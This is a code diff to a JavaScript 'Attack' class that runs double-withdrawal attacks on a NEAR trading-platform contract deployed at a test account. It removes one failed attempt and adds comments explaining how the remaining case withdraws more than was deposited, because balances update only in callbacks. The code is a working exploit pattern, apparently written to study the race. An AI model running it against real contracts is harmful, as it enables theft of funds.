@@ -9,12 +9,10 @@ class Attack {
   attack() {
     // return this.case1();
     return this.case2();
-    // return this.case3();
   }
 
   /**
-   * Works as expected: Everything is run sequentially, so you are not able to overdraft your balance in the trading
-   * platform contract.
+   * Everything is run sequentially, so you are not able to overdraft your balance in the trading platform contract.
    */
   case1() {
     const balance = 10n * 10n ** 24n; // 10 NEAR
@@ -40,8 +38,8 @@ class Attack {
   }
 
   /**
-   * I don't understand what's happening here. Some operations seem to run sequentially (withdraw after deposit works),
-   * some in parallel (double spending attack caused by trading platform not checking the balance in the callback works too).
+   * Here both withdrawals are executed in the same block, while callbacks are executed in the next block. As balance
+   * is updated in the callback, you are able to withdraw more than you deposited.
    */
   case2() {
     const balance = 10n * 10n ** 24n; // 10 NEAR
@@ -59,31 +57,6 @@ class Attack {
         JSON.stringify({ amount: balance.toString() }),
         NO_DEPOSIT,
         GAS,
-      );
-  }
-
-  // Here I would expect double spend attack to work, but it fails with `Cannot callback joint promise`.
-  case3() {
-    const balance = 10n * 10n ** 24n; // 10 NEAR
-
-    return NearPromise.new('trading-platform.test.near')
-      .functionCall('near_deposit', '', balance, GAS)
-      .then(
-        NearPromise.new('trading-platform.test.near')
-          .functionCall(
-            'near_withdraw',
-            JSON.stringify({ amount: balance.toString() }),
-            NO_DEPOSIT,
-            GAS,
-          )
-          .and(
-            NearPromise.new('trading-platform.test.near').functionCall(
-              'near_withdraw',
-              JSON.stringify({ amount: balance.toString() }),
-              NO_DEPOSIT,
-              GAS,
-            ),
-          ),
       );
   }
 }
